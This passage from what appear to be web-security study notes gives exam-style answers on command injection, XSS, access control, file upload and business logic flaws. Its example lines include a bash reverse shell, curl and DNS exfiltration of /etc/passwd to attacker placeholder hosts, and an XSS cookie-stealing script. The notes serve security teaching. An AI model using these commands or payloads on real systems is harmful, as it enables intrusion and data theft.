    * Unix: `;`, `&`, `|`, `||`, `&&`, backticks
  * **Verification techniques**:
    * Harmless commands: `whoami`, `id`, `echo unique_string`
    * Time delays: `ping -c 4 127.0.0.1`, `sleep 10`
    * DNS lookups: `nslookup xyz.attacker.com`
    * Creating/reading files
  * **Observe responses** for command output or behavior changes
</details>

### 3. What are two useful commands for gaining reconnaissance information on **Linux** and **Windows** during an OS command injection attack?

<details>
  <summary>Answer</summary>
  
  On Linux systems, the `id` command provides essential reconnaissance by revealing the current user's identity, group memberships, and privileges. This immediately indicates the level of system access and potential privilege escalation paths. The output shows if the application is running as root (highest privileges) or a restricted user. Another valuable Linux command is `ls -la /etc/`, which displays critical configuration files, potentially exposing sensitive information about system configuration, installed services, and authentication mechanisms.
  
  For Windows systems, `whoami /all` provides comprehensive information about the current user context, including username, privileges, and group memberships. This reveals whether the application is running with administrative rights and identifies potential privilege escalation opportunities. The `ipconfig /all` command displays detailed network configuration information, including IP addresses, network interfaces, DNS servers, and domain information. This aids in network mapping and identifying potential lateral movement paths within the compromised network.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Linux reconnaissance commands**:
    * `id` - shows user, groups, privileges
    * `ls -la /etc/` - reveals configuration files
    * Others: `uname -a` (kernel version), `netstat -tuln` (network connections)
  
  * **Windows reconnaissance commands**:
    * `whoami /all` - shows user context and privileges
    * `ipconfig /all` - reveals network configuration
    * Others: `systeminfo` (OS details), `net user` (account information)
</details>

### 4. How can attackers detect and exploit a **blind OS command injection** vulnerability?

<details>
  <summary>Answer</summary>
  
  In blind OS command injection scenarios, attackers cannot see command output directly in responses. Detection typically begins with time-based techniques, injecting commands like `& ping -c 10 127.0.0.1 &` or `& sleep 10 &` and observing response delays that indicate command execution. These time differentials confirm vulnerability presence without requiring visible output.
  
  Once detected, exploitation continues through several methods. Out-of-band techniques are particularly effective, where attackers force the target to make external connections. For example, injecting `& nslookup uniquestring.attacker-domain.com &` causes the server to make DNS requests containing potentially exfiltrated data to attacker-controlled servers, which can be monitored for successful exploitation.
  
  Attackers may also use file operations to create, modify, or access files within the web root for later retrieval. Command output redirection is another approach, using operators like `>` to write command outputs to accessible locations: `& whoami > /var/www/html/output.txt &`. For complex exploitation, attackers might establish reverse shells with commands like `& bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &` to gain interactive access to the compromised system.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Detection techniques**:
    * Time-based: `sleep 10`, `ping -c 10 127.0.0.1`
    * File creation/modification tests
  
  * **Exploitation methods**:
    * **Out-of-band channels**: DNS/HTTP requests to attacker infrastructure
    * **Data exfiltration**: `& whoami | curl -d @- http://attacker.com &`
    * **Output redirection**: `& whoami > accessible_file.txt &`
    * **Reverse shells**: netcat/bash connections to attacker
    * **Boolean-based**: testing command success with conditionals
</details>

### 5. What are the recommended strategies to prevent **OS command injection** vulnerabilities in web applications?

<details>
  <summary>Answer</summary>
  
  The primary prevention strategy is avoiding OS command execution entirely when possible, replacing shell commands with language-specific functions. For example, use file system APIs instead of calling external commands for file operations. When system commands are necessary, implement a whitelist approach that permits only specific, validated commands with predetermined arguments rather than constructing commands from user input.
  
  Input validation is essential, allowing only alphanumeric characters when feasible and implementing strict validation patterns for all external data. This should be combined with proper context-specific output encoding before using data in command contexts. Applications should also run with the principle of least privilege, ensuring they have only the minimum permissions necessary for operation, limiting potential damage from successful attacks.
  
  When command execution is unavoidable, use built-in parameterization mechanisms like Java's ProcessBuilder or Python's subprocess module with arguments passed as arrays rather than shells. Additionally, implement proper error handling that avoids exposing system information in error messages that could aid attackers in crafting successful exploits.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Avoid OS commands** - use language-specific alternatives
  * **Use whitelist approach** for allowed commands
  * **Input validation** - strict patterns, alphanumeric only
  * **Parameterized APIs** - ProcessBuilder, subprocess with arrays
  * **Principle of least privilege** - minimal permissions
  * **Avoid shell interpreters** - bypass shells when executing commands
  * **Sanitize inputs** contextually for command execution
  * **Proper error handling** - avoid leaking system details
</details>

### 6. What are some **shell metacharacters** that can be used to perform OS command injection attacks, and provide examples of how these can be used?

<details>
  <summary>Answer</summary>
  
  Shell metacharacters are special characters interpreted by command shells to perform specific functions, making them powerful tools for command injection attacks. Semicolons (;) allow execution of multiple commands sequentially. For example, if an application runs `ping $host`, an attacker might input `8.8.8.8; whoami` to execute the whoami command after the ping. 
  
  Ampersands (&, &&) run commands either in parallel or conditionally based on success. In `8.8.8.8 && cat /etc/passwd`, the second command executes only if ping succeeds. Pipe characters (|) redirect output from one command as input to another, enabling command chaining: `8.8.8.8 | cat /etc/passwd`.
  
  Backticks (`) or $() perform command substitution, allowing command output to be embedded within another command: ``ping `whoami`.attacker.com`` triggers a DNS query containing the username. The newline character can separate commands in many shells, while redirectors like > and >> can write command output to files. Some shells also interpret $(command) for command substitution and ${IFS} as the internal field separator, useful for bypassing certain filters.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Semicolon** (`;`) - command sequence: `ping 8.8.8.8; whoami`
  * **Ampersands** (`&`, `&&`) - background/conditional: `ping 8.8.8.8 && cat /etc/passwd`
  * **Pipe** (`|`) - output chaining: `ping 8.8.8.8 | grep "bytes from"`
  * **Backticks/$()**  - command substitution: ``ping `whoami`.evil.com`` or `ping $(whoami).evil.com`
  * **Newline** (`\n`) - command separation in scripts
  * **Redirectors** (`>`, `>>`, `<`) - file operations: `whoami > /tmp/out.txt`
  * **OR operator** (`||`) - conditional execution: `false || whoami`
  * **Brackets** (`{}`) - command grouping: `{ whoami; id; }`
</details>

### 7. How can **OS command injection** be prevented when calling out to OS commands is unavoidable?

<details>
  <summary>Answer</summary>
  
  When OS command execution is unavoidable, use language-specific libraries that avoid shell interpretation. These include Java's ProcessBuilder, Python's subprocess.run with shell=False, PHP's proc_open with array arguments, or Node.js's child_process.execFile. These APIs accept command arguments as separate parameters rather than a single string, preventing shell metacharacter interpretation.
  
  Implement strict input validation using allowlists that permit only necessary characters (typically alphanumerics and limited punctuation) for each parameter. For complex inputs, validate against predefined patterns that match only legitimate values. Additionally, escape all special characters appropriate to the operating system context - this serves as a secondary defense if validation fails.
  
  Run commands with the principle of least privilege by using dedicated service accounts with minimal permissions. When possible, create command templates with fixed structures and only allow parameterization of specific arguments. Finally, implement proper error handling that captures command execution failures without exposing system details to potential attackers.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Use parameterized APIs**:
    * Java: ProcessBuilder
    * Python: subprocess.run(shell=False)
    * PHP: proc_open with arrays
    * Node.js: child_process.execFile
  
  * **Never concatenate strings** for commands
  * **Strict input validation** with allowlists/patterns
  * **Escape special characters** as secondary defense
  * **Run with minimal privileges** using service accounts
  * **Use command templates** with fixed structure
  * **Implement secure error handling**
  * **Audit command execution** logs
</details>

### 8. Explain how an attacker can exfiltrate data using an **out-of-band DNS request**.

<details>
  <summary>Answer</summary>
  
  Out-of-band DNS data exfiltration leverages DNS queries to extract information from systems where direct output viewing isn't possible. The technique exploits the fact that DNS requests typically pass through firewalls, making them ideal covert channels.
  
  In a command injection scenario, attackers first extract the target data using system commands. For example, to capture password file contents on Linux: `cat /etc/passwd`. They then encode this data to make it suitable for DNS transmission, often using base64 or hexadecimal encoding to avoid special characters. Next, they chunk the encoded data into segments that fit within DNS subdomain length limitations (typically 63 characters per label).
  
  Finally, they craft commands that force the server to make DNS lookups containing these data chunks. For example: `ping $(cat /etc/passwd | base64 | fold -w 30).attacker-domain.com`. When executed, the server will attempt to resolve a domain name containing the encoded data, sending a DNS query to the attacker's authoritative DNS server, which logs these queries, allowing the attacker to reconstruct the exfiltrated data from the subdomain portions of the requests.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Process**:
    * Extract sensitive data with system commands
    * Encode data (base64/hex) for DNS transmission
    * Chunk data to fit DNS label limits (63 chars)
    * Force DNS lookups with encoded data as subdomain
  
  * **Example commands**:
    * Linux: `ping $(cat /etc/passwd | base64).attacker.com`
    * Windows: `nslookup %USERNAME%.attacker.com`
  
  * **Advantages**:
    * Bypasses firewalls (DNS typically allowed)
    * Works in blind injection scenarios
    * Difficult to detect without DNS monitoring
    * Leaves minimal traces on target system
</details>

## XSS

A prevalent web vulnerability where attackers inject malicious client-side scripts into pages viewed by other users. These scripts execute in victims' browsers within the security context of the vulnerable site, bypassing same-origin policies. Beyond cookie theft, modern XSS attacks can perform complex actions including keylogging, screen capturing, and session hijacking.

### 1. Define **Cross-Site Scripting** (XSS) and explain how it works.

<details>
  <summary>Answer</summary>
  
  Cross-Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious client-side scripts into webpages viewed by other users. The vulnerability occurs when applications incorporate user-supplied input into responses without proper validation or encoding, causing browsers to execute injected code in the context of the vulnerable site.
  
  XSS works by exploiting the browser's inability to distinguish between legitimate site scripts and malicious injected code. When a victim loads the compromised page, their browser executes all scripts, including the injected malicious code, granting the script access to site-specific data like cookies, session tokens, and DOM content due to the Same Origin Policy. The malicious script effectively impersonates the user, inheriting their privileges within the application.
  
  The attack vector typically involves injecting JavaScript payloads through form fields, URL parameters, or any input eventually reflected in page output. These payloads can steal session information, redirect users to phishing sites, modify page content, capture keystrokes, or perform unauthorized actions on behalf of victims within the vulnerable application.
</details>

<details>
  <summary>Bullets</summary>
  
  * Client-side code injection vulnerability
  * Attacker scripts execute in victim's browser context
  * Exploits inadequate input validation/output encoding
  * Browser executes all scripts without distinguishing sources
  * Malicious script inherits user's site privileges
  * Circumvents Same Origin Policy protections
  * Attack vectors: form inputs, URL parameters, stored data
  * Enables session theft, phishing, content manipulation
</details>

### 2. Describe the three main types of **XSS** vulnerabilities with examples

<details>
  <summary>Answer</summary>
  
  Reflected XSS occurs when malicious scripts are immediately returned in server responses from a current HTTP request. For example, a search function might echo user input: `search.php?q=<script>alert('XSS')</script>`. The application returns this in its response, executing the script in the victim's browser. Attackers typically deliver these attacks via crafted links in emails or messages, requiring victim interaction.
  
  Stored XSS (persistent) occurs when malicious scripts are permanently stored on the target server, usually in databases. For example, a forum comment containing `<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>` is stored and served to anyone viewing that content. This variant is particularly dangerous as it affects all visitors without requiring individual targeting.
  
  DOM-based XSS executes entirely in the browser when client-side JavaScript dynamically updates the page using untrusted data. For example, a JavaScript function processing fragments from URLs: `function showContent() { document.getElementById("content").innerHTML = location.hash.substring(1); }`. An attacker can exploit this with a URL ending with `#<img src=x onerror=alert('XSS')>`, causing the malicious code to execute when the page handles the hash fragment.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Reflected XSS**:
    * Non-persistent, returned immediately in response
    * Requires victim to click malicious link
    * Example: `search?q=<script>alert('XSS')</script>`
    * Attack vector: crafted URLs via email/messages
  
  * **Stored XSS**:
    * Persistent, saved on server (database)
    * Affects all users viewing infected content
    * Example: forum post with `<script>steal(document.cookie)</script>`
    * Attack vector: user-contributed content
  
  * **DOM-based XSS**:
    * Client-side only, browser DOM manipulation
    * Example: `site.com#<img src=x onerror=alert(1)>`
    * Attack vector: URL fragments, client storage
</details>

### 3. What are the potential **impacts of XSS attacks** on web applications and users?

<details>
  <summary>Answer</summary>
  
  XSS attacks can have severe impacts on both users and web applications. For users, session hijacking is a primary risk where attackers steal session cookies or tokens, allowing impersonation and unauthorized account access. Credential theft occurs when XSS is used to create convincing phishing forms within trusted sites, capturing login information. Users may also experience privacy violations through unauthorized data access, or become victims of malware distribution when exploits install trojans or cryptominers via compromised sites.
  
  For web applications, XSS attacks can trigger unauthorized actions using the victim's identity, potentially modifying account settings or initiating transactions. Content defacement damages reputation when attackers modify visible page content. More sophisticated attacks might establish persistent access through stored payloads that create backdoors or hidden admin accounts. Additionally, successful XSS exploits may undermine trust in the application, causing reputational damage and potential regulatory consequences, particularly when personal data protection regulations are violated.
</details>

<details>
  <summary>Bullets</summary>
  
  * **User impacts**:
    * Session hijacking/account takeover
    * Credential theft through fake forms
    * Privacy violations/data exposure
    * Malware/trojan installation
    * Browser exploitation
  
  * **Application impacts**:
    * Unauthorized actions with user privileges
    * Content defacement/UI manipulation
    * Reputation damage/trust erosion
    * Persistent backdoor establishment
    * Regulatory violations/legal consequences
    * Business logic subversion
</details>

### 4. Explain how **XSS vulnerabilities** can be detected and tested in web applications.

<details>
  <summary>Answer</summary>
  
  XSS vulnerabilities can be detected through both manual and automated testing approaches. Manual testing involves identifying input vectors (forms, URL parameters, HTTP headers) and inserting special payloads to detect if they're reflected in responses without proper encoding. Testers use simple probes like `<script>alert('XSS')</script>` or more complex payloads that bypass filters. They also examine how applications handle various contexts (HTML body, attributes, JavaScript) since each requires different encoding mechanisms.
  
  Automated scanning employs specialized tools like OWASP ZAP or Burp Suite that systematically inject test payloads and analyze responses for successful execution. These tools can identify reflections of input data and determine if they're properly sanitized. More advanced detection involves DOM analysis tools that trace data flow from sources (user inputs) to sinks (functions that can execute code) within client-side JavaScript.
  
  For comprehensive testing, code review complements dynamic testing by examining sanitization routines and identifying locations where user input is incorporated into responses. Testing should cover all input vectors and contexts to ensure complete coverage of potential vulnerability points.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Manual testing approaches**:
    * Identify all input vectors (forms, URL parameters, cookies)
    * Insert test payloads (`<script>alert('XSS')</script>`)
    * Test different contexts (HTML body, attributes, JavaScript)
    * Check for filter bypasses (`<img src=x onerror=alert(1)>`)
  
  * **Automated testing**:
    * Security scanners (OWASP ZAP, Burp Suite)
    * DOM analysis tools
    * Payload variation testing
    * Context-aware scanning
  
  * **Code review techniques**:
    * Identify sanitization gaps
    * Trace data flows
    * Review client-side JavaScript
</details>

### 5. Describe effective strategies for preventing **XSS vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  Effective XSS prevention requires a defense-in-depth approach. Context-appropriate output encoding is the primary defense, where data is encoded differently based on its placement: HTML encoding for content, attribute encoding for HTML attributes, and JavaScript encoding for script contexts. Input validation serves as a complementary measure, using allowlists to permit only necessary characters and rejecting potentially malicious patterns.
  
  Modern frameworks often include built-in XSS protections, like React's automatic escaping or Angular's sanitization services. These should be leveraged rather than creating custom solutions. Content Security Policy (CSP) headers provide an additional security layer by restricting script sources and preventing inline script execution, effectively mitigating XSS even when other defenses fail.
  
  Additional measures include using HttpOnly cookies to prevent JavaScript access to sensitive cookies, implementing proper CORS policies, employing security headers like X-XSS-Protection, and regularly conducting security testing to identify vulnerabilities before they can be exploited.
</details>

<details>
  <summary>Bullets</summary>
  
  * **Context-appropriate output encoding**:
    * HTML encoding for content
    * Attribute encoding for HTML attributes
    * JavaScript encoding in script contexts
    * URL encoding for parameters
  
  * **Input validation** with allowlists
  * **Framework protections** - React/Angular sanitization
  * **Content Security Policy** (CSP) headers
  * **HttpOnly flag** for sensitive cookies
  * **X-XSS-Protection header**
  * **DOM sanitization** libraries
  * **Regular security testing**
  * **Separation of data and code**
</details>

## Access Controls

The mechanisms that enforce restrictions on what authenticated users can do within an application. These vulnerabilities arise when an application fails to properly verify that a user has appropriate permissions for the resource or action they're attempting to access. Effective access control requires consistent enforcement across all application functions and appropriate segregation of administrative capabilities.

### 1. Explain the concept of **vertical privilege escalation** and provide an example.

<details>
  <summary>Answer</summary>
  
  Vertical privilege escalation occurs when a user gains access to functionality or resources intended for users with higher privileges within the same system. This vulnerability allows attackers to elevate their privileges from a lower-level user to one with administrative capabilities.
  
  For example, a standard user might modify a parameter in an admin page request from "admin=false" to "admin=true" in their browser, gaining administrative access. Another example is when a regular user manipulates their account ID in a URL to access administrative functions, effectively bypassing proper authorization checks and assuming the role of an administrator.
</details>

<details>
  <summary>Bullets</summary>
  
  * User gains access to higher privilege functions
  * Movement up privilege hierarchy (standard → admin)
  * Examples:
    * Modifying authorization parameters
    * Accessing admin endpoints directly
    * Changing role identifiers in requests
    * Manipulating access control tokens
</details>

### 2. Describe three common causes of **broken access control** vulnerabilities.

<details>
  <summary>Answer</summary>
  
  Broken access control vulnerabilities typically stem from three key issues. First, client-side enforcement occurs when applications rely solely on hiding elements or using JavaScript to control access without server-side verification, allowing attackers to bypass controls by modifying requests. Second, missing function-level authorization checks happen when applications verify authentication but fail to confirm authorization for specific functionality, particularly in API endpoints. Third, insecure configuration often results in overly permissive settings, default credentials, or excessive user privileges that expand the attack surface.
</details>

<details>
  <summary>Bullets</summary>
  
  * Client-side enforcement only
    * Hidden UI elements
    * JS-based restrictions
    * No server validation
  * Missing function-level authorization
    * Authentication without authorization
    * Unprotected API endpoints
  * Insecure configuration
    * Default permissions/credentials
    * Excessive privileges
    * Improper access control settings
</details>

### 3. What is **horizontal privilege escalation**, and how can attackers exploit it?

<details>
  <summary>Answer</summary>
  
  Horizontal privilege escalation occurs when a user accesses resources belonging to another user of the same privilege level, violating proper access boundaries. Attackers typically exploit this by manipulating identifiers in requests that reference user-specific resources.
  
  Common exploitation methods include modifying account parameters in URLs or request bodies (e.g., changing "userId=123" to "userId=124"), tampering with cookies or session tokens to impersonate another user, or exploiting IDOR vulnerabilities where resource references are predictable or inadequately protected. These attacks allow unauthorized access to other users' data without requiring elevated permissions.
</details>

<details>
  <summary>Bullets</summary>
  
  * Access to same-level user resources
  * Lateral movement across user boundaries
  * Exploitation methods:
    * Manipulating user identifiers in requests
    * Parameter tampering in URLs/bodies
    * Cookie/session manipulation
    * Exploiting predictable resource references
    * Bypassing reference checks
</details>

### 4. List and explain three strategies to prevent **access control vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  To prevent access control vulnerabilities, implement a deny-by-default policy where access is explicitly granted rather than assumed, ensuring unauthorized actions are blocked by default. Second, enforce role-based access control (RBAC) with clearly defined roles and permissions, validating every access attempt against the user's assigned role. Third, implement server-side validation by centralizing access control mechanisms and ensuring all authorization checks occur on the server, not relying on client-side controls which can be bypassed.
</details>

<details>
  <summary>Bullets</summary>
  
  * Deny-by-default policy
    * Explicit permissions required
    * Block unauthorized access automatically
  * Role-based access control (RBAC)
    * Defined roles with specific permissions
    * Consistent enforcement
    * Regular privilege review
  * Server-side validation
    * Centralized access control
    * No client-side enforcement
    * Consistent authorization checks
</details>

### 5. Define **Insecure Direct Object Reference (IDOR)** and explain how it can lead to privilege escalation.

<details>
  <summary>Answer</summary>
  
  Insecure Direct Object Reference (IDOR) is a vulnerability where an application exposes internal implementation objects, such as files, directories, or database keys, through user-controllable input without proper authorization checks. This occurs when applications use direct references to resources that can be manipulated by users.
  
  IDOR leads to privilege escalation when attackers modify these references to access unauthorized resources. For example, changing an account ID parameter from "acct=user123" to "acct=admin456" might grant access to an administrator's account. Similarly, modifying a document ID parameter could expose sensitive files belonging to other users or privileged system data.
</details>

<details>
  <summary>Bullets</summary>
  
  * Exposed internal implementation objects via user input
  * No proper authorization verification
  * Leads to privilege escalation:
    * Manipulating reference identifiers
    * Accessing unauthorized resources
    * Bypassing access boundaries
    * Exposing sensitive data/functionality
</details>

### 6. Explain why relying solely on **URL obfuscation** (security through obscurity) is an ineffective access control strategy.

<details>
  <summary>Answer</summary>
  
  Relying solely on URL obfuscation (security through obscurity) is ineffective because it assumes attackers cannot discover hidden endpoints or resource paths. This approach fails to provide actual security controls, instead depending on the secrecy of implementation details. Attackers can discover obscured URLs through various means, including network monitoring, source code examination, or brute force techniques. Additionally, leaked documentation or insider knowledge can easily compromise this approach.
  
  Once discovered, obscured URLs offer no resistance to unauthorized access. Proper security requires authentication, authorization, and validation regardless of endpoint visibility or complexity.
</details>

<details>
  <summary>Bullets</summary>
  
  * Not a security control, just hiding implementation
  * Easily bypassed through:
    * Network traffic analysis
    * Source code inspection
    * Brute forcing
    * Information leakage
    * Insider knowledge
  * No protection once discovered
  * No validation/authentication mechanism
  * False sense of security
</details>

## File Upload Vulnerabilities

When improperly implemented, file upload features can allow attackers to submit malicious files that might execute code, access sensitive data, or compromise server security. These vulnerabilities frequently arise from inadequate validation of file properties and insufficient restrictions on file processing after upload. Robust protection requires multiple layers of validation and secure handling of uploaded content.

### 1. Explain the potential **risks** associated with file upload vulnerabilities in web applications.

<details>
  <summary>Answer</summary>
  
  File upload vulnerabilities expose web applications to several critical risks. Remote code execution can occur when attackers upload executable files (like PHP scripts) that run with server privileges. Cross-site scripting becomes possible through malicious client-side scripts in HTML or SVG files. Server overload may result from uploading extremely large files that consume resources. File system traversal enables accessing sensitive files via path manipulation during upload. Additionally, uploaded malware can serve as persistent backdoors, while content spoofing through deceptive file types may facilitate social engineering attacks.
</details>

<details>
  <summary>Bullets</summary>
  
  * Remote code execution (server-side scripts)
  * Cross-site scripting (malicious client scripts)
  * Server overload (resource consumption)
  * File system traversal (path manipulation)
  * Malware distribution
  * Persistent backdoor access
  * Content spoofing (file type deception)
</details>

### 2. Describe three techniques attackers use to **bypass file upload validation** mechanisms.

<details>
  <summary>Answer</summary>
  
  Attackers bypass file upload validation through several techniques. First, extension manipulation involves changing malicious file extensions to permitted ones (renaming shell.php to shell.jpg) or using double extensions (shell.jpg.php) to confuse parsers. Second, content-type spoofing modifies the MIME type in HTTP requests to match allowed types, deceiving server-side validation. Third, bypassing client-side validation is achieved by intercepting and modifying requests using proxy tools, circumventing JavaScript checks that prevent uploading restricted file types entirely.
</details>

<details>
  <summary>Bullets</summary>
  
  * Extension manipulation
    * Changing extensions (.php → .jpg)
    * Double extensions (malicious.jpg.php)
    * Case manipulation (Shell.PhP)
  * Content-type spoofing
    * Modifying MIME type in requests
    * Making executable appear as image/document
  * Bypassing client-side validation
    * Intercepting requests with proxies
    * Circumventing JavaScript checks
</details>

### 3. List and briefly explain four measures to **prevent file upload vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  To prevent file upload vulnerabilities, implement robust content validation by checking both file extensions and content signatures to verify file types match declared types. Implement file size restrictions to prevent denial-of-service attacks through oversized uploads. Store uploaded files outside the webroot directory to prevent direct execution via URL. Finally, use randomized filenames upon storage to prevent predictable access and overwrite attacks, while maintaining appropriate file permissions to restrict execution rights.
</details>

<details>
  <summary>Bullets</summary>
  
  * Content validation
    * File extension whitelist
    * Content-type verification
    * File signature/magic bytes checking
  * File size restrictions
    * Prevent DoS from large files  
  * Store outside webroot
    * Prevent direct execution via URL
  * Randomize filenames
    * Prevent predictable access paths
    * Maintain proper permissions
</details>

### 4. What is a **web shell**, and how can it be used in exploiting file upload vulnerabilities?

<details>
  <summary>Answer</summary>
  
  A web shell is a malicious script uploaded to a web server that provides an attacker with a browser-based interface to remotely execute commands with the server's privileges. In file upload vulnerabilities, attackers upload these web shells disguised as legitimate files (images, documents) by bypassing validation controls. Once uploaded, the attacker accesses the shell via URL, gaining command execution capabilities to explore the system, escalate privileges, access sensitive data, or pivot to other systems. Web shells provide persistent access that often evades detection by security monitoring tools.
</details>

<details>
  <summary>Bullets</summary>
  
  * Malicious script providing command execution interface
  * Exploitation process:
    * Bypass upload restrictions
    * Upload disguised as legitimate file
    * Access via direct URL
  * Capabilities:
    * Remote command execution
    * File system navigation
    * Data exfiltration
    * Privilege escalation
    * Persistence mechanism
</details>

### 5. Identify and explain three common **mistakes developers make** when implementing file upload functionality.

<details>
  <summary>Answer</summary>
  
  Developers commonly make three critical mistakes with file uploads. First, relying solely on client-side validation that can be bypassed using proxy tools, allowing malicious files to reach the server. Second, implementing incomplete file type verification by checking only file extensions or MIME types but not both, enabling attackers to disguise malicious files as legitimate ones. Third, using insufficient file handling practices like predictable storage locations, inadequate file permissions, or keeping uploaded files within the webroot where they can be directly executed by the web server.
</details>

<details>
  <summary>Bullets</summary>
  
  * Client-side-only validation
    * JavaScript checks easily bypassed
    * No server-side verification
  * Incomplete file type verification
    * Checking extension only
    * Trusting Content-Type headers
    * No content analysis
  * Insufficient file handling
    * Predictable storage paths
    * Preserving original filenames
    * Storing in webroot
    * Overly permissive access rights
</details>

### 6. Explain the concept of **race conditions** in the context of file upload vulnerabilities.

<details>
  <summary>Answer</summary>
  
  Race conditions in file upload vulnerabilities exploit timing gaps between file validation and processing operations. Attackers upload malicious files that temporarily pass initial security checks before being manipulated during this window of vulnerability. For example, an attacker might upload a harmless file that passes validation, then quickly replace it with malicious content before processing completes, or upload a file with a dangerous extension that gets checked and renamed during different processing phases.
  
  These race conditions occur due to non-atomic file operations and inadequate locking mechanisms, allowing the security state to change between verification and usage.
</details>

<details>
  <summary>Bullets</summary>
  
  * Timing vulnerability between validation and processing
  * Exploitation methods:
    * Upload valid file → replace with malicious
    * Manipulate file during processing
    * Exploit temporary file handling
  * Root causes:
    * Non-atomic operations
    * Inadequate locking mechanisms
    * Multiple processing stages
    * Time-of-check vs time-of-use gaps
</details>

## Business Logic Vulnerabilites

Unlike technical vulnerabilities that exploit coding flaws, these target the application's underlying business processes and workflows. They arise from flawed assumptions about user behavior and incomplete validation of process sequences. These vulnerabilities are particularly challenging to detect through automated scanning as they involve manipulating legitimate application functionality in unexpected ways.

### 1. Define **business logic vulnerabilities** and explain why they are often difficult to detect.

<details>
  <summary>Answer</summary>
  
  Business logic vulnerabilities are flaws in an application's design and implementation that allow attackers to manipulate legitimate functionality in unintended ways. Unlike technical vulnerabilities, they exploit the intended application workflow rather than implementation bugs or security mechanisms.
  
  These vulnerabilities are difficult to detect because they don't trigger errors or exceptions, instead misusing valid operations in ways developers didn't anticipate. Automated scanning tools struggle to identify them since they require understanding application-specific context and business rules. Additionally, these flaws often manifest only through specific sequences of legitimate actions that collectively create security issues, making them challenging to discover during testing.
</details>

<details>
  <summary>Bullets</summary>
  
  * Flaws in application design/workflow
  * Manipulation of legitimate functionality
  * Difficult to detect because:
    * Don't trigger errors/exceptions
    * Application-specific context required
    * Automated tools ineffective
    * Require business domain knowledge
    * Involve valid operations in unexpected sequences
</details>

### 2. Identify and describe three common causes of **business logic vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  Business logic vulnerabilities commonly stem from inadequate input validation where applications fail to validate that user inputs make business sense in context, allowing manipulation of quantities, prices, or discount applications. Another cause is insufficient process integrity checks, where applications don't verify that multi-step processes occur in the correct order or with proper authorization at each stage. Third, these vulnerabilities arise from improper enforcement of business constraints, such as failing to prevent duplicate submissions, enforce quantity limits, or ensure transaction consistency.
</details>

<details>
  <summary>Bullets</summary>
  
  * Inadequate input validation
    * Missing context-aware validation
    * Accepting illogical values
    * Parameter manipulation opportunities
  * Insufficient process integrity checks
    * Step-skipping vulnerabilities
    * Missing state verification
    * Order manipulation
  * Improper enforcement of business constraints
    * Duplicate submission issues
    * Limit/boundary condition failures
    * Transaction inconsistency
</details>

### 3. Discuss the potential **impacts** of business logic vulnerabilities on an organisation.

<details>
  <summary>Answer</summary>
  
  Business logic vulnerabilities can devastate organizations financially through price manipulation, discount abuse, or free service acquisition that directly impacts revenue. Reputational damage occurs when exploits become public, eroding customer trust and business partnerships. Data integrity issues arise when logic flaws allow unauthorized data modifications or access, compromising critical business information. These vulnerabilities may also create regulatory compliance violations by circumventing required processes or controls, potentially resulting in significant fines. The combined impact can threaten business continuity and competitive advantage.
</details>

<details>
  <summary>Bullets</summary>
  
  * Financial losses
    * Revenue reduction
    * Fraudulent transactions
    * Resource theft
  * Reputational damage
    * Loss of customer trust
    * Brand impact
  * Data integrity compromise
    * Unauthorized modifications
    * Invalid business data
  * Regulatory compliance violations
    * Process circumvention
    * Control bypassing
  * Business continuity threats
</details>

### 4. Provide two examples of how **business logic vulnerabilities** can be exploited in real-world scenarios.

<details>
  <summary>Answer</summary>
  
  In e-commerce systems, price manipulation vulnerabilities occur when attackers modify parameters during checkout to change prices or apply unauthorized discounts. For example, changing a hidden form field value from "$100" to "$1" or manipulating quantity values to receive negative values that reduce the total price. Another example is authentication bypass in multi-step processes, where attackers identify and skip critical verification steps. For instance, in password reset flows, an attacker might complete the initial request and then skip the verification email step by directly accessing the password change endpoint.
</details>

<details>
  <summary>Bullets</summary>
  
  * E-commerce price manipulation
    * Modifying price parameters
    * Negative quantity exploitation
    * Stacking incompatible discounts
    * Currency switching abuse
  * Authentication/process bypass
    * Skipping verification steps
    * Direct access to restricted endpoints
    * Password reset flow manipulation
    * State parameter tampering
</details>

### 5. Outline three strategies that developers can implement to **prevent business logic vulnerabilities**.

<details>
  <summary>Answer</summary>
  
  To prevent business logic vulnerabilities, developers should implement comprehensive input validation that considers business context, not just format or type, ensuring values make sense within the application's logic. Second, enforce proper state management by tracking and validating the user's progress through multi-step processes, preventing step skipping or out-of-order execution. Third, establish clear security requirements during design by conducting threat modeling focused on business flows and documenting expected limitations, constraints, and edge cases that might be exploited.
</details>

<details>
  <summary>Bullets</summary>
  
  * Context-aware input validation
    * Validate business sense, not just format
    * Check for logical constraints
    * Server-side enforcement
  * Proper state management
    * Track progress through workflows
    * Prevent step skipping
    * Verify prerequisites for each action
  * Security-focused design process
    * Business-oriented threat modeling
    * Document constraints and limits
    * Consider edge cases during design
</details>


## Past Paper 1

### 1. As web server responses are received by the web browser, they will include a status code to signal what type of response it is. HTTP response codes are grouped into five families that provide similar type of status codes. Provide the **numeric code grouping** of these families with a short description of what they represent.

<details>
  <summary>Answer</summary>
  
  HTTP response status codes are grouped into five categories based on their first digit:
  
  1. **1xx (Informational)**: These status codes indicate that the request was received and understood. They are provisional responses, informing the client that the server has received the request and is processing it. Examples include 100 (Continue) and 101 (Switching Protocols).
  
  2. **2xx (Success)**: These status codes confirm that the client's request was successfully received, understood, and processed. The most common is 200 (OK), but others include 201 (Created), 204 (No Content), and 206 (Partial Content).
  
  3. **3xx (Redirection)**: These status codes inform the client that further action is needed to complete the request, typically involving redirection to another resource. Examples include 301 (Moved Permanently), 302 (Found), 304 (Not Modified), and 307 (Temporary Redirect).
  
  4. **4xx (Client Error)**: These status codes indicate that the client has made an error in their request. Common examples include 400 (Bad Request), 401 (Unauthorized), 403 (Forbidden), 404 (Not Found), and 429 (Too Many Requests).
  
